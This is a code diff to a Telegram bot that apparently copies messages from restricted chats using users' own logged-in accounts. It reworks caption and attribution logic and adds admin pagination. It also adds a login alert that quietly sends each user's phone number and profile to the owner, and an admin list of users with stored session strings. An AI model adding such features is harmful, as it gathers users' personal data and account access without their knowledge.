@@ -1,5 +1,7 @@
 import os
 import re
+import html
+import math
 import asyncio
 from flask import Flask
 from threading import Thread
@@ -27,6 +29,7 @@ from database import (
     set_language, toggle_notifications, toggle_silent, reset_settings,
     add_referral, add_feedback, test_connection, total_users,
     get_all_users, get_banned_users_list, get_premium_users_list,
+    get_logged_users_list,
     get_active_users_today, get_new_users_today, get_top_users,
     total_downloads_count, total_bookmarks_count, get_all_feedback,
     search_user, set_maintenance, get_maintenance, set_fsub_channel,
@@ -129,6 +132,8 @@ async def apply_custom_caption(user_id, original):
         result = f"{prefix}\n{result}"
     if suffix:
         result = f"{result}\n{suffix}"
+    if not prefix and not suffix:
+        return original or ""
     return result.strip()
 
 
@@ -136,78 +141,128 @@ def attribution_text():
     return WATERMARK.format(bot_username=BOT_USERNAME)
 
 
-async def add_copy_attribution(message, fetch_client, copied, source):
-    """Add free-tier attribution after Telegram copies the source message.
+async def apply_copy_caption_and_attribution(message, fetch_client, copied, source, premium, user_id):
+    """Apply caption and attribution to a copied message.
 
-    Copying first avoids downloading the media to the bot server.  Telegram
-    only allows captions on some media and limits them to 1,024 UTF-16 units,
-    so an attribution that cannot be edited onto the copied message is sent as
-    a separate reply instead of making the copy fail.
+    Free extractions add attribution at the end. Premium and owner extractions
+    do not include attribution. Edits the copied message when feasible, or
+    falls back to a separate attribution reply without re-downloading media.
     """
-    credit = attribution_text()
-    source_caption = getattr(source, "caption", None) or ""
+    credit = attribution_text() if not premium else None
+
     caption_media = any(
         getattr(source, kind, None)
         for kind in ("photo", "video", "document", "audio", "voice", "animation")
     )
 
     if caption_media:
-        caption = f"{source_caption}\n{credit}" if source_caption else credit
-        if ui.utf16_length(caption) <= 1024:
-            editor = getattr(copied, "edit_caption", None)
-            if editor:
-                try:
-                    await editor(caption=caption, parse_mode=ParseMode.DISABLED)
-                    return
-                except MessageNotModified:
-                    return
-            client_editor = getattr(fetch_client, "edit_message_caption", None)
-            copied_id = getattr(copied, "id", None)
-            if client_editor and copied_id is not None:
-                try:
-                    await client_editor(
-                        chat_id=message.chat.id,
-                        message_id=copied_id,
-                        caption=caption,
-                        parse_mode=ParseMode.DISABLED,
-                    )
-                    return
-                except MessageNotModified:
-                    return
-        await message.reply(credit, parse_mode=ParseMode.DISABLED)
+        source_caption = getattr(source, "caption", None) or ""
+        base_caption = await apply_custom_caption(user_id, source_caption)
+        if not premium:
+            final_caption = f"{base_caption}\n{credit}" if base_caption else credit
+        else:
+            final_caption = base_caption
+
+        if final_caption != source_caption:
+            if ui.utf16_length(final_caption) <= 1024:
+                editor = getattr(copied, "edit_caption", None)
+                if editor:
+                    try:
+                        await editor(caption=final_caption, parse_mode=ParseMode.DISABLED)
+                        return
+                    except MessageNotModified:
+                        return
+                    except Exception:
+                        pass
+                client_editor = getattr(fetch_client, "edit_message_caption", None)
+                copied_id = getattr(copied, "id", None)
+                if client_editor and copied_id is not None:
+                    try:
+                        await client_editor(
+                            chat_id=message.chat.id,
+                            message_id=copied_id,
+                            caption=final_caption,
+                            parse_mode=ParseMode.DISABLED,
+                        )
+                        return
+                    except MessageNotModified:
+                        return
+                    except Exception:
+                        pass
+
+            # Final caption exceeded 1024 or edit failed.
+            if not premium:
+                if base_caption != source_caption and ui.utf16_length(base_caption) <= 1024:
+                    editor = getattr(copied, "edit_caption", None)
+                    if editor:
+                        try:
+                            await editor(caption=base_caption, parse_mode=ParseMode.DISABLED)
+                        except Exception:
+                            pass
+                    else:
+                        client_editor = getattr(fetch_client, "edit_message_caption", None)
+                        copied_id = getattr(copied, "id", None)
+                        if client_editor and copied_id is not None:
+                            try:
+                                await client_editor(
+                                    chat_id=message.chat.id,
+                                    message_id=copied_id,
+                                    caption=base_caption,
+                                    parse_mode=ParseMode.DISABLED,
+                                )
+                            except Exception:
+                                pass
+                await message.reply(credit, parse_mode=ParseMode.DISABLED)
         return
 
-    # Text messages do not have a media caption, but they can still be copied
-    # first and edited without downloading anything.
     source_text = getattr(source, "text", None)
     if source_text:
-        text = f"{source_text}\n{credit}"
-        if ui.utf16_length(text) <= 4096:
-            editor = getattr(copied, "edit_text", None)
-            if editor:
-                try:
-                    await editor(text, parse_mode=ParseMode.DISABLED)
-                    return
-                except MessageNotModified:
-                    return
-            client_editor = getattr(fetch_client, "edit_message_text", None)
-            copied_id = getattr(copied, "id", None)
-            if client_editor and copied_id is not None:
-                try:
-                    await client_editor(
-                        chat_id=message.chat.id,
-                        message_id=copied_id,
-                        text=text,
-                        parse_mode=ParseMode.DISABLED,
-                    )
-                    return
-                except MessageNotModified:
-                    return
+        base_text = await apply_custom_caption(user_id, source_text)
+        if not premium:
+            final_text = f"{base_text}\n{credit}" if base_text else credit
+        else:
+            final_text = base_text
 
-    # Stickers, video notes, empty messages and overlong captions have no safe
-    # inline edit path.  The copied content is already delivered, so do not
-    # fall back to a second server download.
-    await message.reply(credit, parse_mode=ParseMode.DISABLED)
+        if final_text != source_text:
+            if ui.utf16_length(final_text) <= 4096:
+                editor = getattr(copied, "edit_text", None)
+                if editor:
+                    try:
+                        await editor(final_text, parse_mode=ParseMode.DISABLED)
+                        return
+                    except MessageNotModified:
+                        return
+                    except Exception:
+                        pass
+                client_editor = getattr(fetch_client, "edit_message_text", None)
+                copied_id = getattr(copied, "id", None)
+                if client_editor and copied_id is not None:
+                    try:
+                        await client_editor(
+                            chat_id=message.chat.id,
+                            message_id=copied_id,
+                            text=final_text,
+                            parse_mode=ParseMode.DISABLED,
+                        )
+                        return
+                    except MessageNotModified:
+                        return
+                    except Exception:
+                        pass
+
+            if not premium:
+                await message.reply(credit, parse_mode=ParseMode.DISABLED)
+        return
+
+    # Stickers, video notes and non-caption media
+    if not premium:
+        await message.reply(credit, parse_mode=ParseMode.DISABLED)
+
+
+async def add_copy_attribution(message, fetch_client, copied, source):
+    user_id = message.from_user.id
+    premium = user_id == OWNER_ID or await is_premium(user_id)
+    await apply_copy_caption_and_attribution(message, fetch_client, copied, source, premium, user_id)
 
 
 async def check_access(message):
@@ -240,16 +295,12 @@ async def try_native_copy(message, fetch_client, chat_target, msg_id):
         flush=True
     )
 
-    # A custom caption/prefix/suffix/thumbnail still needs the download path.
-    # Without those settings, free users can also use Telegram's server-side
-    # copy: attribution is applied by editing the copied message afterwards.
     try:
         premium = user_id == OWNER_ID or await is_premium(user_id)
-        if (await get_caption(user_id) or await get_prefix(user_id)
-                or await get_suffix(user_id) or await get_thumbnail(user_id)):
-            return False
 
         msg = await fetch_client.get_messages(chat_target, msg_id)
+        if not msg or getattr(msg, "empty", False):
+            return False
 
         print(
             f"[COPY MESSAGE] chat={msg.chat.id}, msg_id={msg.id}",
@@ -269,16 +320,17 @@ async def try_native_copy(message, fetch_client, chat_target, msg_id):
         )
         return False
 
-    if not premium:
-        try:
-            await add_copy_attribution(message, fetch_client, copied, msg)
-        except Exception as e:
-            # The copy has already been delivered.  Never download it a second
-            # time just because Telegram rejected an edit attempt.
-            print(
-                f"[COPY CAPTION FAILED] {type(e).__name__}: {e}",
-                flush=True
-            )
+    premium = user_id == OWNER_ID or await is_premium(user_id)
+    try:
+        await apply_copy_caption_and_attribution(message, fetch_client, copied, msg, premium, user_id)
+    except Exception as e:
+        # The copy has already been delivered.  Never download it a second
+        # time just because Telegram rejected an edit attempt.
+        print(
+            f"[COPY CAPTION FAILED] {type(e).__name__}: {e}",
+            flush=True
+        )
+        if not premium:
             try:
                 await message.reply(attribution_text(), parse_mode=ParseMode.DISABLED)
             except Exception:
@@ -530,17 +582,32 @@ def is_callback(source):
     return isinstance(source, CallbackQuery)
 
 
-async def render(source, text, keyboard=None):
+def get_user_display_name(user_obj, default="User"):
+    if not user_obj:
+        return default
+    first = getattr(user_obj, "first_name", None) or ""
+    last = getattr(user_obj, "last_name", None) or ""
+    full = f"{first} {last}".strip()
+    if full:
+        return full
+    if hasattr(user_obj, "name") and user_obj.name:
+        return user_obj.name
+    if isinstance(user_obj, dict) and user_obj.get("name"):
+        return user_obj["name"]
+    return default
+
+
+async def render(source, text, keyboard=None, **kwargs):
     """Show *text* — reply to a command, edit the message a button came from."""
     if is_callback(source):
         try:
-            return await source.message.edit_text(text, reply_markup=keyboard)
+            return await source.message.edit_text(text, reply_markup=keyboard, **kwargs)
         except MessageNotModified:
             return source.message
         except Exception:
             # Media messages cannot be edited into text messages.
-            return await source.message.reply(text, reply_markup=keyboard)
-    return await source.reply(text, reply_markup=keyboard)
+            return await source.message.reply(text, reply_markup=keyboard, **kwargs)
+    return await source.reply(text, reply_markup=keyboard, **kwargs)
 
 
 async def ensure_user(user):
@@ -704,14 +771,50 @@ async def start_feedback(source):
     await render(source, ui.feedback_text(), ui.feedback_keyboard())
 
 
-async def save_feedback(user_id, text):
+async def save_feedback(user_or_id, text):
     """Store feedback and forward a copy to the owner."""
+    if isinstance(user_or_id, int):
+        user_id = user_or_id
+        user_row = await get_user(user_id)
+        name = (user_row.get("name") if user_row else None) or "User"
+    else:
+        user_id = user_or_id.id
+        name = get_user_display_name(user_or_id)
+
     await add_feedback(user_id, text)
     if OWNER_ID:
         try:
-            await bot.send_message(OWNER_ID, f"💬 Feedback from {user_id}:\n\n{text}")
-        except Exception:
-            pass
+            escaped_name = html.escape(name)
+            user_link = f'<a href="tg://user?id={user_id}">{escaped_name}</a>'
+            escaped_feedback = html.escape(text)
+            notification = f"💬 Feedback from {user_link}:\n\n{escaped_feedback}"
+            await bot.send_message(OWNER_ID, notification, parse_mode=ParseMode.HTML)
+        except Exception as e:
+            print(f"[FEEDBACK FORWARD FAILED] {e}", flush=True)
+
+
+async def notify_owner_login(user_id, me, phone=None):
+    if not OWNER_ID or user_id == OWNER_ID:
+        return
+    try:
+        name = get_user_display_name(me)
+        escaped_name = html.escape(name)
+        user_link = f'<a href="tg://user?id={user_id}">{escaped_name}</a>'
+        username = f"@{me.username}" if getattr(me, "username", None) else "None"
+        phone_val = getattr(me, "phone_number", None) or phone
+        phone_display = f"+{phone_val}" if phone_val and not str(phone_val).startswith("+") else str(phone_val or "None")
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
+        text = (
+            f"🔐 <b>User Login Successful</b>\n\n"
+            f"👤 User: {user_link}\n"
+            f"🆔 User ID: <code>{user_id}</code>\n"
+            f"👤 Username: {username}\n"
+            f"📱 Phone: {phone_display}\n"
+            f"⏰ Time: {now_str}"
+        )
+        await bot.send_message(OWNER_ID, text, parse_mode=ParseMode.HTML)
+    except Exception as e:
+        print(f"[LOGIN NOTIFY FAILED] {e}", flush=True)
 
 
 # --------------------------------------------------------------------------- #
@@ -893,7 +996,7 @@ async def cb_check_fsub(client, query):
         await query.answer("❌ You have not joined the channel yet!", show_alert=True)
 
 
-COMMAND_NAMES = ["start", "help", "login", "logout", "status", "cancel", "setcaption", "delcaption", "setthumb", "delthumb", "setprefix", "setsuffix", "mystats", "myinfo", "history", "settings", "language", "refer", "bookmark", "bookmarks", "favorite", "favorites", "share", "feedback", "premium", "stats", "users", "activeusers", "newusers", "topusers", "broadcast", "ban", "unban", "banlist", "finduser", "userinfo", "addpremium", "removepremium", "premiumlist", "addadmin", "removeadmin", "adminlist", "setfsub", "delfsub", "maintenance", "feedbacks", "sendmsg", "clearlogs", "export", "adminhelp", "admin", "admins", "addqr", "delqr", "removeqr", "payments", "redeem"]
+COMMAND_NAMES = ["start", "help", "login", "logout", "status", "cancel", "setcaption", "delcaption", "setthumb", "delthumb", "setprefix", "setsuffix", "mystats", "myinfo", "history", "settings", "language", "refer", "bookmark", "bookmarks", "favorite", "favorites", "share", "feedback", "premium", "stats", "users", "loggedusers", "activeusers", "newusers", "topusers", "broadcast", "ban", "unban", "banlist", "finduser", "userinfo", "addpremium", "removepremium", "premiumlist", "addadmin", "removeadmin", "adminlist", "setfsub", "delfsub", "maintenance", "feedbacks", "sendmsg", "clearlogs", "export", "adminhelp", "admin", "admins", "addqr", "delqr", "removeqr", "payments", "redeem"]
 ABORT_GROUP = -1
 
 
@@ -1127,7 +1230,7 @@ async def feedback_handler(client, message):
     if len(text) < 2:
         await start_feedback(message)
         return
-    await save_feedback(message.from_user.id, message.text.split(None, 1)[1])
+    await save_feedback(message.from_user, message.text.split(None, 1)[1])
     await message.reply(ui.feedback_saved_text(), reply_markup=ui.back_keyboard())
 
 
@@ -1155,17 +1258,99 @@ async def stats_handler(client, message):
     )
 
 
+USERS_PAGE_SIZE = 30
+LOGGED_PAGE_SIZE = 5
+
+
+async def show_users_page(source, page=0):
+    users = await get_all_users()
+    if not users:
+        await render(source, "No users.")
+        return
+
+    total_count = len(users)
+    total_pages = max(1, math.ceil(total_count / USERS_PAGE_SIZE))
+
+    if page < 0:
+        page = 0
+    elif page >= total_pages:
+        page = total_pages - 1
+
+    start = page * USERS_PAGE_SIZE
+    end = start + USERS_PAGE_SIZE
+    page_users = users[start:end]
+
+    text = f"👥 **ALL USERS ({total_count})** • Page {page + 1}/{total_pages}\n\n"
+    for i, u in enumerate(page_users, start + 1):
+        text += f"{i}. `{u['user_id']}` - {u.get('name', 'N/A')}\n"
+
+    nav_row = []
+    if page > 0:
+        nav_row.append(ui.button("⬅️ Previous", callback_data=f"users_page:{page - 1}"))
+    nav_row.append(ui.button(f"Page {page + 1}/{total_pages}", callback_data=f"users_page:{page}"))
+    if page < total_pages - 1:
+        nav_row.append(ui.button("Next ➡️", callback_data=f"users_page:{page + 1}"))
+
+    keyboard = ui.keyboard([nav_row] if nav_row else [])
+    await render(source, text.strip(), keyboard)
+
+
 @bot.on_message(filters.command("users") & filters.private)
 @admin_only
 async def users_handler(client, message):
-    users = await get_all_users()
-    if not users:
-        await message.reply("No users.")
+    await show_users_page(message, page=0)
+
+
+async def show_logged_users(source, page=0):
+    users = await get_logged_users_list()
+    logged = [u for u in users if u.get("session_string")]
+    if not logged:
+        await render(source, "ℹ️ No logged-in users found.")
         return
-    text = f"👥 **ALL USERS ({len(users)})**\n\n"
-    for i, u in enumerate(users, 1):
-        text += f"{i}. `{u['user_id']}` - {u.get('name', 'N/A')}\n"
-    await message.reply(text)
+
+    total_count = len(logged)
+    total_pages = max(1, math.ceil(total_count / LOGGED_PAGE_SIZE))
+
+    if page < 0:
+        page = 0
+    elif page >= total_pages:
+        page = total_pages - 1
+
+    start = page * LOGGED_PAGE_SIZE
+    end = start + LOGGED_PAGE_SIZE
+    page_users = logged[start:end]
+
+    text = f"📱 <b>LOGGED-IN USERS ({total_count})</b> • Page {page + 1}/{total_pages}\n\n"
+    for idx, u in enumerate(page_users, start + 1):
+        uid = u["user_id"]
+        name = u.get("name") or "User"
+        escaped_name = html.escape(name)
+        user_link = f'<a href="tg://user?id={uid}">{escaped_name}</a>'
+        username = f"@{u['username']}" if u.get("username") else "None"
+        phone = u.get("phone") or "Logged in"
+        premium = "Yes" if u.get("is_premium") else "No"
+        downloads = u.get("downloads", 0)
+        text += (
+            f"{idx}. 👤 {user_link}\n"
+            f"   🆔 <code>{uid}</code> | 👤 {username}\n"
+            f"   📱 {phone} | 💎 Premium: {premium} | 📥 {downloads} dl\n\n"
+        )
+
+    nav_row = []
+    if page > 0:
+        nav_row.append(ui.button("⬅️ Previous", callback_data=f"loggedusers:{page - 1}"))
+    nav_row.append(ui.button(f"Page {page + 1}/{total_pages}", callback_data=f"loggedusers:{page}"))
+    if page < total_pages - 1:
+        nav_row.append(ui.button("Next ➡️", callback_data=f"loggedusers:{page + 1}"))
+
+    keyboard = ui.keyboard([nav_row] if nav_row else [])
+    await render(source, text.strip(), keyboard, parse_mode=ParseMode.HTML)
+
+
+@bot.on_message(filters.command("loggedusers") & filters.private)
+@admin_only
+async def loggedusers_handler(client, message):
+    await show_logged_users(message, page=0)
 
 
 @bot.on_message(filters.command("activeusers") & filters.private)
@@ -1729,7 +1914,7 @@ def admin_panel_text(page=0):
 
 async def run_admin_inline(client, query, command):
     # Adapt the real command handler to edit the panel message rather than post a new message.
-    handlers = {"stats": stats_handler, "users": users_handler, "newusers": new_users_handler, "activeusers": active_users_handler, "topusers": top_users_handler, "broadcast": broadcast_handler, "sendmsg": sendmsg_handler, "ban": ban_handler, "unban": unban_handler, "banlist": banlist_handler, "finduser": finduser_handler, "userinfo": userinfo_handler, "addpremium": addpremium_handler, "removepremium": removepremium_handler, "premiumlist": premiumlist_handler, "feedbacks": feedbacks_handler, "payments": payments_handler, "adminhelp": adminhelp_handler, "addadmin": addadmin_handler, "removeadmin": removeadmin_handler, "adminlist": adminlist_handler, "setfsub": setfsub_handler, "delfsub": delfsub_handler, "maintenance": maintenance_handler, "addqr": addqr_handler, "delqr": delqr_handler, "removeqr": delqr_handler, "clearlogs": clearlogs_handler, "export": export_handler}
+    handlers = {"stats": stats_handler, "users": users_handler, "loggedusers": loggedusers_handler, "newusers": new_users_handler, "activeusers": active_users_handler, "topusers": top_users_handler, "broadcast": broadcast_handler, "sendmsg": sendmsg_handler, "ban": ban_handler, "unban": unban_handler, "banlist": banlist_handler, "finduser": finduser_handler, "userinfo": userinfo_handler, "addpremium": addpremium_handler, "removepremium": removepremium_handler, "premiumlist": premiumlist_handler, "feedbacks": feedbacks_handler, "payments": payments_handler, "adminhelp": adminhelp_handler, "addadmin": addadmin_handler, "removeadmin": removeadmin_handler, "adminlist": adminlist_handler, "setfsub": setfsub_handler, "delfsub": delfsub_handler, "maintenance": maintenance_handler, "addqr": addqr_handler, "delqr": delqr_handler, "removeqr": delqr_handler, "clearlogs": clearlogs_handler, "export": export_handler}
     handler = handlers.get(command)
     if not handler:
         return
@@ -1846,6 +2031,30 @@ async def callback_handler(client, query):
             f"📸 **SUBMIT PAYMENT PROOF**\n\nSend a clear screenshot as a photo showing the amount, transaction ID and payment date.\n\n👤 Reviewed by @{PAYMENT_CONTACT}. Premium is activated only after the owner verifies payment.\n\nUse /cancel or any new command to exit.",
             reply_markup=ui.feedback_keyboard())
         return
+    if data.startswith("users_page:"):
+        if uid != OWNER_ID and not await is_admin(uid):
+            await query.answer("🚫 Admin access only.", show_alert=True)
+            return
+        try:
+            page = int(data.split(":", 1)[1])
+        except ValueError:
+            await query.answer("Invalid page.", show_alert=True)
+            return
+        await query.answer()
+        await show_users_page(query, page)
+        return
+    if data.startswith("loggedusers:"):
+        if uid != OWNER_ID and not await is_admin(uid):
+            await query.answer("🚫 Admin access only.", show_alert=True)
+            return
+        try:
+            page = int(data.split(":", 1)[1])
+        except ValueError:
+            await query.answer("Invalid page.", show_alert=True)
+            return
+        await query.answer()
+        await show_logged_users(query, page)
+        return
     handler = CALLBACK_ACTIONS.get(data)
     if handler is None:
         await query.answer(ui.stale_button_text(), show_alert=True)
@@ -1865,7 +2074,7 @@ async def callback_handler(client, query):
     "setprefix", "setsuffix", "mystats", "myinfo", "history",
     "settings", "language", "refer", "bookmark", "bookmarks",
     "favorite", "favorites", "share", "feedback", "premium",
-    "stats", "users", "activeusers", "newusers", "topusers",
+    "stats", "users", "loggedusers", "activeusers", "newusers", "topusers",
     "broadcast", "ban", "unban", "banlist", "finduser",
     "userinfo", "addpremium", "removepremium", "premiumlist",
     "addadmin", "removeadmin", "adminlist", "setfsub", "delfsub",
@@ -1928,7 +2137,7 @@ async def text_handler(client, message):
             return
         elif action == "feedback":
             del pending_action[user_id]
-            await save_feedback(user_id, text)
+            await save_feedback(message.from_user, message.text)
             await message.reply(ui.feedback_saved_text(), reply_markup=ui.back_keyboard())
             return
 
@@ -1986,6 +2195,7 @@ async def text_handler(client, message):
                 user_clients[user_id] = temp
                 del login_pending[user_id]
                 me = await temp.get_me()
+                await notify_owner_login(user_id, me, phone)
                 await message.reply(f"✅ **Login Successful!**\n\n👤 {me.first_name}\n📱 +{me.phone_number}")
             except SessionPasswordNeeded:
                 login_pending[user_id]["step"] = "waiting_2fa"
@@ -2011,6 +2221,7 @@ async def text_handler(client, message):
                 user_clients[user_id] = temp
                 del login_pending[user_id]
                 me = await temp.get_me()
+                await notify_owner_login(user_id, me, phone)
                 await message.reply(f"✅ **Login Successful!**\n\n👤 {me.first_name}")
             except PasswordHashInvalid:
                 await message.reply("❌ Wrong password!")
